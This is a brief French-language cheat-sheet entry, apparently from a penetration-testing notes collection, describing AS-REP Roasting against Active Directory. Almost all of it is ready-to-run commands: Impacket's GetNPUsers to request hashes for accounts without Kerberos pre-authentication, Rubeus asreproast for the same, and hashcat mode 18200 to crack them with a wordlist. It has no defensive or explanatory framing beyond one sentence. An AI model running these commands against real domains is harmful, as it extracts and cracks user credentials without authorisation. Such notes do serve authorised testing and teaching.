## AS-REP Roasting
AS-REP Roasting vide les hachages krbasrep5 des comptes d'utilisateurs pour lesquels la pré-authentification Kerberos est désactivée.

**Impacket**

```sh
impacket-GetNPUsers.py target.local/user:password -dc-ip 192.168.x.x -request
```

**Rubeus**

```sh
C:\User\Administrator> Rubeus.exe asreproast
```

```sh
hashcat -m 18200 hash.txt Pass.txt
```